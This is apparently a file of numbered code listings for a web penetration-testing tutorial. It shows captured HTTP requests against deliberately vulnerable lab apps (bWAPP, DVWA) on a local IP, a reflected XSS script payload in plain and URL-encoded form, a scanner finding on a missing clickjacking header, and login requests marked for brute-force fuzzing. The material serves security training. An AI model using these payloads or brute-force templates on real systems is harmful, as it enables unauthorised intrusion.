@@ -1,0 +1,94 @@
+//code 4.1
+POST /bWAPP/user_new.php HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/bWAPP/user_new.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+Cookie: PHPSESSID=q9llh7kbrha95q8gr4b850mjo3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+login=foo&email=foo%40bar.com&password=foo1234&password_conf=foo1234&secret=my+secret&action=create
+
+--------------------
+
+//code 4.2
+<script>alert("Hello, this is reflected XSS");</script>
+
+------------
+
+//code 4.3
+GET /bWAPP/xss_get.php?firstname=%3Cscript%3Ealert%28%22Hello%2C+this+is+reflected+xss%22%29&lastname=%3C%2Fscript%3E&form=submit HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert%28%22Hello%2C+this+is+reflected+xss%22%29%29&lastname=%3C%2Fscript%3E&form=submit
+Cookie: PHPSESSID=uppr7dk5kgu1he5utku9fcetk5; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; security_level=0
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------
+
+//code 4.4
+Description    
+
+X-Frame-Options header is not included in the HTTP response to protect against 'ClickJacking' attacks.
+URL    http://192.168.2.3/vicnum/
+Method    GET
+Parameter    X-Frame-Options
+Instances    1
+Solution    
+
+
+-----------------
+
+//code 4.5
+POST /dvwa/login.php HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/dvwa/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Cookie: security=low; PHPSESSID=cv8hr0pa3evsb6v26hv05pt103; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+username=user&password=password&Login=Login
+
+
+-------------------------
+
+//code 4.6
+POST /dvwa/login.php HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/dvwa/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Cookie: security=low; PHPSESSID=cv8hr0pa3evsb6v26hv05pt103; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin&Login=Â§LoginÂ§
+
+
+----------------------------
+
+
+
